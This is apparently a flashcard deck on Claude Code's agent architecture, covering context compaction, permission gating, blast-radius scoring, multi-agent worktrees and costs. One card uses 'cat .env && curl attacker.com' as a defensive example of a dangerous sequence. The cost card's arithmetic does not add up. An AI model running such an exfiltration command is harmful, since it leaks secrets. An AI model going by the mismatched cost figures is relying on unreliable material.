ID	Front	Back	Tags
CC001	What is Claude Code's fundamental architecture and how does it differ from IDE autocomplete?	A continuous orchestration loop (ReAct pattern): model reasons about state, selects tool action, executes it, observes result, decides next step until task completion. Fundamentally different from stateless autocomplete - it's an autonomous runtime with shell access, permission gating, and context retention across hours.	topic:claude,topic:agents,level:beginner,type:definition,source:research-summary
CC002	What are the three hard problems in building agentic coding systems?	1) Retaining decision context across hours of execution (context corruption). 2) Constraining autonomous shell access without creating approval fatigue. 3) Detecting task completion without ground-truth oracles (knowing when to stop).	topic:claude,topic:agents,level:intermediate,type:definition,source:research-summary
CC003	What is the five-layer context compaction pipeline?	L1: Active buffer (last 4K tokens, 1:1). L2: Recent history (3:1, command-result preservation). L3: Session summary (10:1, decision node extraction). L4: Architectural state (50:1, dependency graph). L5: Project manifest (200:1, static repo context). Each layer uses different compression objectives.	topic:claude,topic:agents,level:intermediate,type:algorithm,source:research-summary
CC004	Why do standard summarization metrics (ROUGE/BERTScore) fail for agent context compaction?	They optimize for surface-level semantic similarity between original and compressed text. But agent coherence requires preserving causal chains: a single variable binding defined 2 hours ago may determine 50 subsequent operations while representing 0.01% of tokens. ROUGE cannot distinguish decision-critical from narrative.	topic:claude,topic:agents,level:advanced,type:why,source:research-summary
CC005	What is the formal objective for context compaction in agentic systems?	H(A_{t+1} | C'_t) approximately equals H(A_{t+1} | C_t) - compressed context must preserve the conditional entropy of future agent decisions. Lossy compression of narrative is acceptable but lossy compression of causal chains is catastrophic.	topic:claude,topic:agents,level:advanced,type:formula,source:research-summary
CC006	What is the Model Context Protocol (MCP) and why is it strategically important?	MCP is a standardized protocol for AI agents to connect to external systems (Slack, GitHub, databases) - "HTTP for AI agents." Decouples agent from specific integrations. Strategic insight: competitive moats are shifting from model quality to ecosystem connectivity. The agent with broadest tool graph wins.	topic:claude,topic:agents,level:intermediate,type:definition,source:research-summary
CC007	How does the multi-tier permission gating system work?	Read-only (auto-approve), Write-local (auto-approve + log), Write-destructive (require approval), Network-egress (require approval), Credential-access (hard block). System tracks operation sequences to detect escalation patterns - individually safe operations composing into dangerous workflows.	topic:claude,topic:agents,level:intermediate,type:algorithm,source:research-summary
CC008	What is "approval fatigue" and how is it mitigated?	Users rubber-stamp all permission prompts after repeated approvals, providing zero safety. Mitigation: batch low-risk approvals with risk score summaries, track approval velocity (rapid approvals trigger extra confirmation for high-risk), use risk-budget authorization where users grant session budgets.	topic:claude,topic:agents,level:intermediate,type:tradeoff,source:practitioner
CC009	What is the blast-radius formalization for agent operations?	B(op) = scope(op) x reversibility(op)^{-1} x sensitivity(data_accessed). Must be computed over operation SEQUENCES, not individual commands. "cat .env" has low B; "cat .env && curl attacker.com" has extreme B. Sliding window of recent operations computes sequence-level blast radius.	topic:claude,topic:agents,level:advanced,type:formula,source:research-summary
CC010	How does Git worktree isolation enable multi-agent parallel execution?	Each sub-agent operates in its own Git worktree (independent working directory, shared repository). Prevents file-level conflicts between agents. The merge phase resolves conflicts using dependency-aware ordering. Tradeoff: 4x disk space for 3x throughput.	topic:claude,topic:agents,level:intermediate,type:algorithm,source:research-summary
CC011	What is the ReAct pattern that underlies agentic coding?	Interleave reasoning and acting: at each step, model Reasons about current state, Acts by selecting a tool, observes the result, and decides next step. Creates a closed feedback loop grounded in real execution results (test failures, compiler errors, git conflicts).	topic:claude,topic:agents,level:beginner,type:definition,source:research-summary
CC012	What are the primary production failure modes in agentic coding systems?	API timeouts (35%), tool execution errors (28%), context corruption (18%), permission misconfigurations (7%). Most dangerous: "silent wrongness" where agent completes tasks with subtle errors that compound. Building reliable agents is a distributed systems problem, not a model quality problem.	topic:claude,topic:agents,level:intermediate,type:definition,source:practitioner
CC013	What is Reflexion and how does it improve agent task completion?	Reflexion introduces episodic memory of past failures. When a test fails, agent generates a "reflection" explaining what went wrong and stores it. On retry, reflection biases agent away from same mistake. Limitation: quality depends on accurate failure attribution - misdiagnosis leads to spiraling.	topic:claude,topic:agents,paper:reflexion,level:intermediate,type:algorithm,source:research-summary
CC014	How do you prevent reflection spirals in agentic loops?	Implement novelty detector measuring semantic distance between successive attempts. If cosine(reason_t, reason_{t-1}) > 0.92, force fundamentally different approach or escalate to human. Cap retries at 3-5 with mandatory strategy changes between attempts.	topic:claude,topic:agents,level:intermediate,type:algorithm,source:practitioner
CC015	What is an Agent-Computer Interface (ACI) and why is it superior to raw shell?	Purpose-built tools for code navigation/editing (search, open file, scroll, edit range) that constrain action space to productive operations. SWE-agent showed custom interfaces outperform raw shell by reducing decision space and error rate. Claude Code uses hybrid: ACI for code + guarded shell for system ops.	topic:claude,topic:agents,paper:swe-agent,level:intermediate,type:comparison,source:research-summary
CC016	What is CLAUDE.md (repository manifest) and what problem does it solve?	Machine-readable project specification providing persistent, structured context about coding conventions, architecture, workflows. Solves cold-start problem for agents entering unfamiliar codebases. Integrates as high-priority L4/L5 content that survives aggressive compression.	topic:claude,topic:agents,level:beginner,type:definition,source:research-summary
CC017	What is the per-task cost breakdown for Claude Code at production scale?	LLM input: $0.45 (150K tokens). LLM output: $0.375 (25K tokens). Context compaction: $0.038. Tool execution: $0.030. Sandbox: $0.040. MCP calls: $0.300. Total: ~$1.23/task. Monthly at 50K tasks: ~$73K ($73/user).	topic:claude,topic:agents,level:intermediate,type:definition,source:practitioner
CC018	How does the coordinator-worker multi-agent pattern work?	Coordinator decomposes tasks, manages worker pool, aggregates results, monitors progress. Workers operate in isolated worktrees with scoped context and local tool access. Parallelism pays off when n*task_cost / (task_cost + coordination) > 1. Sweet spot: 3-5 agents.	topic:claude,topic:agents,level:intermediate,type:algorithm,source:research-summary
